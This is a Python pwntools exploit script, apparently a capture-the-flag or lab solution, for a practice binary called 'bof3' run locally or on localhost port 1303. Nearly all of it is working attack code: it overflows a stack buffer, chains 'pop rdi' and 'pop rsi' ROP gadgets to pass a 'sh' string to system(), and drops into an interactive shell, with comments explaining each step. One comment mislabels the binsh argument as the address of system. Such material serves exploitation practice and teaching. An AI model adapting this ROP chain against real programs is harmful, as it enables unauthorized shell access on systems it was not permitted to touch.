from pwn import *

path = './bof3'
# Open local process for debugging
if args.REMOTE:
    p = remote('localhost', 1303)
else:
    p = process(path)
# Open the file as a ELF so that we can extract information
# without hardcoding. e.g. we can resolve the address of system in the GOT
e = ELF(path)

pause()
# /bin/sh is in the string that gets printed after our output is read in
# we can reuse this string to provide it as an argument to system()
binsh = next(e.search('sh'))
# get address of system()
system = e.symbols['system']

# `pop rdi; ret` gadget
pop_rdi_ret = 0x4011fb
# `pop rsi; pop r15; ret` gadget
pop_rsi_pop_r15_ret = 0x4011f9

# fill up `buf1`
payload = 'a' * 0x20
# fill up rbp
payload += 'a' * 0x8
# write gadget to the return address
payload += p64(pop_rdi_ret)
# write address of system to here so that we can load '/bin/sh' into rdi
# on the `pop rdi` of `pop rdi; ret` gadget
payload += p64(binsh)
# write address of the `pop rsi; pop r15l ret` gadget to here 
# so that we can jump to it and set rsi
# on the `ret` of `pop rdi; ret` gadget
payload += p64(pop_rsi_pop_r15_ret)
# write 0 to set rsi to 0
# on the `pop rsi` on the `pop rsi; pop r15l; ret` gadget
payload += p64(0)
# write 0 to set r15 to 0 (the value of r15 doesn't matter actually)
# on the `pop r15` on the `pop rsi; pop r15l; ret` gadget
payload += p64(0)
# write system to jump to system (rdi and rsi have been set to /bin/sh and 0 [NULL])
# on the `ret` on the `pop rsi; pop r15l; ret` gadget
payload += p64(system)


p.sendline(payload)

p.interactive()

